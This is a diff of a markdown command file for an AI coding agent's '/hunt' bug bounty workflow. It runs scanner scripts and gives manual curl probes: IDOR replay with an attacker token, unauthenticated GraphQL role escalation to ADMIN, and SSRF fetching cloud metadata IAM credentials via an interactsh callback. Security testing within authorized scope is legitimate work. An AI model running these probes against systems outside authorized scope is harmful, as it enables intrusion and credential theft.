@@ -1,36 +1,96 @@
 ---
-description: Start hunting on a target — loads scope, reads disclosed reports, picks best attack surface based on tech stack, runs targeted vuln checks. Usage: /hunt target.com [--vuln-class ssrf|idor|xss|sqli|oauth|race|graphql|llm|upload|business-logic]
+description: Active vulnerability hunt against a target by invoking tools/hunt.py (which calls vuln_scanner.sh against recon/<target>/). Auto-runs recon first if no recon dir exists. Usage: /hunt target.com
 ---
 
 # /hunt
 
-Active vulnerability hunting on a target.
+Active vulnerability hunting on a target. **Always invoke the production script directly** — do not re-interpret the methodology below as instructions to execute step-by-step. The methodology is reference material; the script is the entry point.
 
-## What This Does
+## Run This (the only required step)
 
-1. Reads program scope (in-scope assets, exclusions, payment behavior)
-2. Loads recon output from `recon/<target>/` if available
-3. Detects tech stack and maps to primary bug classes
-4. Runs targeted tests for the highest-ROI bug classes
-5. Documents findings with exact HTTP requests
+```bash
+# If recon/<target>/ already exists, scan only:
+python3 tools/hunt.py --target target.com --scan-only
+
+# If no recon yet, run the full pipeline (recon then scan):
+python3 tools/hunt.py --target target.com
+
+# Quick mode (fewer checks, faster):
+python3 tools/hunt.py --target target.com --quick
+```
+
+That's it. The script:
+1. Reads `recon/<target>/` (subdomains, live hosts, URLs, gf-classified candidates).
+2. Runs `tools/vuln_scanner.sh recon/<target>/` — XSS (dalfox), SQLi (linear-scaling verifier), SSTI math-canary probes, race conditions, RCE PoC, MFA/SAML checks.
+3. Writes results to `findings/<target>/` with a `summary.txt`.
+
+Output you should see (not a loop):
+
+```
+██████  ██████  ██   ██ ██   ██ ███   █ ███████
+██   ██ ██   ██ ██   ██ ██   ██ ████  █   ███
+██████  ██████  ███████ ██   ██ ██ ██ █   ███
+██████  ██████  ███████ ██   ██ ██  ███   ███
+██   ██ ██   ██ ██   ██ ██   ██ ██   ██   ███
+██████  ██████  ██   ██ ███████ ██   ██   ███
+
++ Recon. Hunt. Validate. Report. +
+
+┌──────────────────────────────────────────────────────┐
+│ Target  target.com                                   │
+│ Mode    full                                         │
+│ Output  recon/target.com/                            │
+│ Auth    session loaded                               │
+└──────────────────────────────────────────────────────┘
+
+ ● local   Ready   type /hunt to begin
+
+bbhunt v4.3
+
+[*] Running vulnerability scanner on target.com...
+[+] XSS pipeline: N candidates
+[+] SQLi verifier: ...
+[+] SSTI canary: ...
+[✓] HUNT COMPLETE — Summary Dashboard
+```
+
+Pass `--no-banner` for piped / CI output. Pipe through `python3 tools/dashboard.py --tail --kind scan --target target.com` for a live phase-by-phase progress dashboard instead of streaming logs.
 
 ## Usage
 
 ```
-/hunt target.com
-/hunt target.com --vuln-class idor          # focus on one bug class (lower tokens, faster)
-/hunt target.com --vuln-class ssrf
-/hunt target.com --vuln-class graphql
-/hunt target.com --source-code ./repo       # static analysis + live testing
-/hunt target.com --chrome                   # browser-based testing via Chrome MCP
-/hunt targets.txt                           # multi-target: one domain per line
+/hunt target.com                       (full hunt — recon then scan)
+/hunt target.com --quick               (fewer checks; faster)
+/hunt target.com --vuln-class idor     (manual deep-dive — see methodology below)
+/hunt target.com --source-code ./repo  (static + live)
+/hunt target.com --chrome              (browser-based — needs Chrome MCP)
+/hunt targets.txt                      (multi-target — one domain per line)
 ```
+
+`--vuln-class`, `--source-code`, `--chrome`, and multi-target are manual-mode flags that switch you out of the scripted pipeline and into the methodology below. They are not arguments to `tools/hunt.py`.
+
+## Troubleshooting: "/hunt is looping / not actually hunting"
+
+Symptom: `/recon` finishes, `recon/<target>/` is populated, but `/hunt target.com` just re-reads files, re-plans, and never invokes any scanner. Common on free / weaker models.
+
+Cause: The model is reading the methodology prose below and trying to re-implement it step-by-step instead of running the production script.
+
+Fix (run this directly in a shell — no prompt needed):
+```bash
+python3 tools/hunt.py --target target.com --scan-only
+```
+
+If `tools/vuln_scanner.sh` reports missing tools, install them first:
+```bash
+bash tools/install_tools.sh
+```
+
+If you're on a free OpenRouter model and the agent keeps narrating instead of executing, add this to your prompt:
+> Run `python3 tools/hunt.py --target target.com --scan-only` and report the output. Do not re-implement the steps. Do not narrate the methodology. Run the command.
 
 ## Session Isolation
 
-**One session per target.** Claude accumulates context — testing two targets in one session
-causes cross-contamination where payloads, assumptions, and findings from target A
-affect target B.
+**One session per target.** Claude accumulates context — testing two targets in one session causes cross-contamination where payloads, assumptions, and findings from target A affect target B.
 
 ```bash
 claude  →  /hunt targetA.com   # Terminal 1
@@ -45,156 +105,129 @@ api.target.com
 app.target.com
 admin.target.com
 ```
-Then: `/hunt targets.txt --vuln-class idor`
-
-Each target runs independently. Findings scoped per-target in hunt memory.
+Then loop the script:
+```bash
+while read -r t; do
+  python3 tools/hunt.py --target "$t" --quick
+done < targets.txt
+```
 
 ## Source Code Mode (--source-code)
 
-```
-/hunt target.com --source-code ./path/to/repo
-/hunt target.com --source-code https://github.com/org/repo
-```
+`tools/hunt.py` does not consume source code directly. For `--source-code`, treat it as a manual workflow:
 
-Enables:
-- Hardcoded secrets and API key grep
-- Route-to-controller mapping — find endpoints with missing auth decorators
-- Dangerous function scan: eval, exec, unserialize, raw SQL concat
-- Cross-reference source findings with live endpoint scan
+1. Grep for hardcoded secrets and API keys.
+2. Map routes → controllers; flag endpoints missing auth decorators.
+3. Grep for dangerous sinks: `eval`, `exec`, `unserialize`, raw SQL concat.
+4. Cross-reference findings against the live endpoints in `recon/<target>/live/urls.txt`.
 
 ## Chrome MCP Mode (--chrome)
 
-```
-/hunt target.com --chrome
-```
-
-Requires Chrome MCP configured in Claude Code settings. Enables:
+Requires Chrome MCP configured in Claude Code settings. Enables flows the headless scanner can't reach:
 - OAuth / SSO / 2FA flows that require JS
 - DOM-based XSS (invisible to curl probes)
 - WebSocket endpoints
 - SPA route discovery (React/Vue/Angular)
 - Real file upload and form submission
 
+This is manual; not driven by `tools/hunt.py`.
+
+---
+
+# Reference Methodology (manual deep-dive — only when `--vuln-class` or `--source-code` is set)
+
+Everything below is reference material for the manual flow. **Do not execute these as steps when running plain `/hunt target.com`** — the production script above already covers them. Use this section only when working a specific endpoint, bug class, or chain by hand.
+
 ## Phase 1: Read Before Touching (15 min)
 
 ### Read Program Scope
-```
 1. Go to program page (HackerOne/Bugcrowd/Intigriti)
 2. Note ALL in-scope domains — only test these
-3. Note ALL out-of-scope domains — never test these (Vienna: /advuew/* excluded!)
+3. Note ALL out-of-scope domains — never test these
 4. Note impact types accepted (some exclude "low" severity)
 5. Check average bounty — signals program generosity
-```
 
 ### Read Disclosed Reports (Intel)
-```bash
-# HackerOne Hacktivity for this program:
-# https://hackerone.com/TARGET_NAME/hacktivity
+HackerOne Hacktivity for this program:
+- `https://hackerone.com/TARGET_NAME/hacktivity`
+- `https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR`
+- `https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF`
 
-# Search by bug class:
-# https://hackerone.com/hacktivity?querystring=TARGET_NAME+IDOR
-# https://hackerone.com/hacktivity?querystring=TARGET_NAME+SSRF
-
-# Extract from each report:
-# 1. Which endpoint
-# 2. Which bug class
-# 3. What parameter
-# 4. What check was missing
-# 5. What they paid
-```
+Extract from each report: which endpoint, which bug class, what parameter, what check was missing, what they paid.
 
 ## Phase 2: Tech Stack Detection (2 min)
 
 ```bash
 TARGET="target.com"
-
-curl -sI https://$TARGET | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
-
-# Stack → Primary bug class:
-# Ruby on Rails  → mass assignment, IDOR
-# Django         → IDOR (ModelViewSet), SSTI
-# Flask          → SSTI (render_template_string), SSRF
-# Laravel        → mass assignment, IDOR
-# Express/Node   → prototype pollution, path traversal
-# Spring Boot    → Actuator endpoints, SSTI
-# Next.js        → SSRF via Server Actions, open redirect
-# GraphQL        → introspection, IDOR via node(), auth bypass on mutations
+curl -sI "https://$TARGET" | grep -iE "server|x-powered-by|x-aspnet|x-runtime|x-generator"
 ```
 
-## Phase 3: Active Testing
+Stack → Primary bug class:
+- Ruby on Rails → mass assignment, IDOR
+- Django → IDOR (ModelViewSet), SSTI
+- Flask → SSTI (render_template_string), SSRF
+- Laravel → mass assignment, IDOR
+- Express/Node → prototype pollution, path traversal
+- Spring Boot → Actuator endpoints, SSTI
+- Next.js → SSRF via Server Actions, open redirect
+- GraphQL → introspection, IDOR via node(), auth bypass on mutations
 
-### IDOR Testing (highest ROI)
+## Phase 3: Active Testing (manual — when the scripted scan isn't enough)
+
+### IDOR
+
+Create two accounts (attacker + victim). Log in as attacker, perform actions, note all IDs in requests. Replay with attacker's token but victim's IDs.
 
 ```bash
-# Setup: create two accounts (attacker + victim)
-# Log in as attacker, perform actions, note all IDs in requests
-# Replay with attacker's token but victim's IDs
-
-# Test HTTP method variations:
-# If GET /api/user/123/orders is protected:
-curl -X DELETE https://target.com/api/user/123/orders \
+# HTTP method variation:
+curl -X DELETE "https://target.com/api/user/123/orders" \
   -H "Authorization: Bearer ATTACKER_TOKEN"
 
-# Test API version differences:
-# Protected: /api/v2/user/123/data
-# Try: /api/v1/user/123/data (older version, may lack auth)
+# Older API version:
+curl "https://target.com/api/v1/user/123/data"
 
-# Test GraphQL node():
-# {"query": "{ node(id: \"dXNlcjoy\") { ... on User { email phone } } }"}
+# GraphQL node():
+curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{ node(id: \"dXNlcjoy\") { ... on User { email phone } } }"}'
 ```
 
-### Auth Bypass Testing
+### Auth Bypass
 
 ```bash
-# Check all siblings — if 9 have auth, find the 1 that doesn't:
 for endpoint in export delete share archive download restore transfer admin; do
   curl -s -o /dev/null -w "$endpoint: %{http_code}\n" \
     "https://target.com/api/users/123/$endpoint" \
     -H "Authorization: Bearer ATTACKER_TOKEN"
 done
 
-# Remove auth entirely:
 curl -s "https://target.com/api/users/123/profile"  # no auth header
 ```
 
-### SSRF Testing
+### SSRF
 
 ```bash
-# Find URL parameters in recon output
 cat recon/$TARGET/ssrf-candidates.txt | head -20
 
-# Test with cloud metadata
-# Use interactsh for OOB confirmation:
 interactsh-client &
 INTERACT_URL="http://$(interactsh-client --poll)"
-
-# Test payloads:
 curl "https://target.com/api/image?url=$INTERACT_URL"
-curl "https://target.com/api/webhook" -d "{\"url\": \"$INTERACT_URL\"}"
 
 # If DNS callback confirmed → escalate to internal:
 curl "https://target.com/api/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
-### GraphQL Testing
+### GraphQL
 
 ```bash
-# Introspection check
-curl -s -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name } } }"}'
+curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}'
 
-# If introspection on → enumerate mutations
-# Look for: createUser, deletePost, updateRole, assignAdmin
-
-# Test auth bypass on mutations:
-curl -s -X POST https://target.com/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query": "mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
-# Without auth header — does it work?
+# If introspection on → enumerate mutations, then try without auth:
+curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
+  -d '{"query":"mutation { updateUserRole(userId: 456, role: ADMIN) { success } }"}'
 ```
 
-## Phase 4: The A→B Signal Method
+## Phase 4: A→B Signal Method
 
 When you confirm bug A, immediately check for B and C:
 
@@ -208,10 +241,7 @@ When you confirm bug A, immediately check for B and C:
 | OAuth no PKCE | CSRF on OAuth flow | Auth code reuse |
 | Race on coupons | Race on credits/wallet | Race on rate limits |
 
-**3 rules before pursuing B:**
-1. Confirm A is real first (exact HTTP request + response)
-2. B must be a DIFFERENT bug (different endpoint OR mechanism OR impact)
-3. B must pass Gate 0 independently
+3 rules before pursuing B: confirm A is real first (exact HTTP request + response); B must be a DIFFERENT bug; B must pass Gate 0 independently.
 
 ## Phase 5: Document Findings
 
@@ -222,7 +252,6 @@ Create `targets/<target>/SESSION.md`:
 
 ## Active Leads
 - [14:22] /api/v2/invoices/{id} — no ownership check visible. Testing...
-- [14:35] User-Agent reflected in error — checking if stored
 
 ## Dead Ends (don't revisit)
 - /admin → IP restricted. Hard stop.
@@ -236,8 +265,7 @@ Create `targets/<target>/SESSION.md`:
 
 ## 20-Minute Rotation Rule
 
-Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class.
-**Fresh context finds more bugs than brute force.**
+Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln class. **Fresh context finds more bugs than brute force.**
 
 ## Stop Signals (move on if you see these)
 
@@ -248,8 +276,7 @@ Every 20 min ask: "Am I making progress?" No → rotate to next endpoint or vuln
 
 ## Getting Specific Results (Anti-Vague Rule)
 
-If Claude gives you a generic message like "try testing for XSS" or "check for IDOR",
-that is not useful. Demand specificity by including this in your prompt:
+If Claude gives you a generic message like "try testing for XSS" or "check for IDOR", that is not useful. Demand specificity:
 
 ```
 Give me the EXACT curl command to test endpoint X.
@@ -257,18 +284,6 @@ Include: full URL, exact headers (including auth token placeholder), exact body.
 Do not describe what to do — show the command.
 ```
 
-Example:
-```
-I found /api/v2/users/{id}/invoices returns a 200 for any user.
-Give me the exact curl to confirm IDOR from an attacker account.
-My attacker token is ATTACKER_TOKEN, victim user ID is 456.
-```
-
-The tool should ALWAYS respond with runnable commands, not descriptions.
-If it doesn't, add: "Show commands only. No prose."
-
 ## Auto-Memory (runs at session end)
 
-When the hunt session ends, run `/remember` to log a summary to hunt memory so `/pickup` picks it up next time.
-
-Runs silently — non-fatal. Keeps memory populated without requiring a manual note.
+When the hunt session ends, run `/remember` to log a summary to hunt memory so `/pickup` picks it up next time. Runs silently — non-fatal. Keeps memory populated without requiring a manual note.
